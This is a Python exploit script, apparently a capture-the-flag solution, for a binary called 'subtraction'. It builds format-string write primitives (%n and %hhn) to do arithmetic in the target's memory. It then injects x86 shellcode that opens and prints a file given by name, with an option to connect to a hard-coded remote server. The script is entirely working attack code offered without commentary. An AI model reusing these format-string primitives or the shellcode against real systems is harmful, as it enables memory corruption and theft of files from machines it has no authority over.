#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './subtraction'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)

def exploit():
    # write('./urandom', flat(0x800, 0xdead, 0xbeaf))
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('202.120.7.218', 12321)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def offset_to_idx(offset):
        assert offset % 4 == 0
        assert offset >= -8
        return offset / 4 + 5

    def addr_to_idx(address):
        return offset_to_idx(address - INPUT_BASE)

    def move_int(src, dst):
        io.send(fit({
            0: '%*{}$c%{}$n'.format(addr_to_idx(src), offset_to_idx(0x1c)),
            0x1c: dst,
        }, length=0x20))

    def move_byte(src, dst):
        io.send(fit({
            0: '%*{}$c%{}$hhn'.format(addr_to_idx(src), offset_to_idx(0x1c)),
            0x1c: dst,
        }, length=0x20))

    def set_int(addr, val):
        if val > 0:
            prefix = '%{}c'.format(val)
        else:
            prefix = ''
        io.send(fit({
            0: '{}%{}$n'.format(prefix, offset_to_idx(0x1c)),
            0x1c: addr,
        }, length=0x20))

    def set_byte(addr, val):
        if val > 0:
            prefix = '%{}c'.format(val)
        else:
            prefix = ''
        io.send(fit({
            0: '{}%{}$hhn'.format(prefix, offset_to_idx(0x1c)),
            0x1c: addr,
        }, length=0x20))

    def calc_double(src, dst):
        io.send(fit({
            0: '%*{0}$c%*{0}$c%{1}$n'.format(addr_to_idx(src), offset_to_idx(0x1c)),
            0x1c: dst,
        }, length=0x20))

    def add_int(src, dst, val):
        io.send(fit({
            0: '%*{0}$c%{2}c%{1}$n'.format(addr_to_idx(src), offset_to_idx(0x1c), val),
            0x1c: dst,
        }, length=0x20))

    def add_var(src, dst, val_addr):
        io.send(fit({
            0: '%*{0}$c%*{2}$c%{1}$n'.format(addr_to_idx(src), offset_to_idx(0x1c), addr_to_idx(val_addr)),
            0x1c: dst,
        }, length=0x20))

    RANDOM_BASE = 0xdead1000
    INPUT_BASE = RANDOM_BASE + 0x8
    TMP_BASE = RANDOM_BASE + 0x100
    BYTE_BASE = RANDOM_BASE + 0x200
    BIT_BASE = RANDOM_BASE + 0x300
    FLIP_BYTE_BASE = RANDOM_BASE + 0x400
    FLIP_INT_BASE = RANDOM_BASE + 0x500
    ANSWER_ADDR = RANDOM_BASE + 0x800
    FUCKING_ADDR = RANDOM_BASE + 0x600

    add_int(RANDOM_BASE, ANSWER_ADDR, 1)

    set_int(FLIP_INT_BASE, 0)
    for i in xrange(4):
        move_int(RANDOM_BASE + 4, TMP_BASE - i)
        set_int(TMP_BASE + 1, 0)
        set_int(BYTE_BASE, 0)
        move_int(TMP_BASE, BYTE_BASE + 1)

        set_int(FLIP_BYTE_BASE, 0)
        for j in xrange(8):
            # get highest bit
            set_int(TMP_BASE, 0)
            calc_double(BYTE_BASE, TMP_BASE - 1)
            set_byte(TMP_BASE, 0)

            # flip bit
            calc_double(TMP_BASE, TMP_BASE - 1)
            add_int(TMP_BASE, TMP_BASE, 254)
            set_byte(TMP_BASE + 1, 0)
            calc_double(TMP_BASE, TMP_BASE)
            set_byte(TMP_BASE, 0)

            # save bit
            cur_bit_addr = BIT_BASE + j * 4
            move_int(TMP_BASE, cur_bit_addr)
            set_byte(cur_bit_addr, 0)

            # join flipped bits
            calc_double(FLIP_BYTE_BASE, FLIP_BYTE_BASE)
            add_var(FLIP_BYTE_BASE, FLIP_BYTE_BASE, cur_bit_addr)
            set_byte(FLIP_BYTE_BASE, 0)

            # clear highest bit
            calc_double(BYTE_BASE, BYTE_BASE)
            set_int(BYTE_BASE + 2, 0)
            set_byte(BYTE_BASE, 0)

        move_int(FLIP_BYTE_BASE, FLIP_BYTE_BASE - 1)
        set_byte(FLIP_BYTE_BASE + 1, 1)
        move_int(FLIP_BYTE_BASE, FLIP_INT_BASE + i)
        set_byte(FLIP_INT_BASE + i + 1, 0)

        set_int(TMP_BASE, 0)
        move_int(ANSWER_ADDR, TMP_BASE - i)
        set_byte(FLIP_BYTE_BASE + 1, 0)
        add_var(TMP_BASE, ANSWER_ADDR + i, FLIP_BYTE_BASE)


    io.send('\0' * 0x20)
    code = asm('''
        jmp end
    open:
        pop ebx
        mov ecx, 0
        mov eax, 5
        int 0x80
        mov ebx, eax
        mov edx, 0x80
        mov ecx, esp
        mov eax, 3
        int 0x80
        mov ebx, 1
        mov eax, 4
        int 0x80
        mov eax, 1
        int 0x80
    end:
        call open
    ''') + args['FILENAME'] + '\00'
    io.send(code.ljust(96))

    io.interactive()

if __name__ == '__main__':
    exploit()
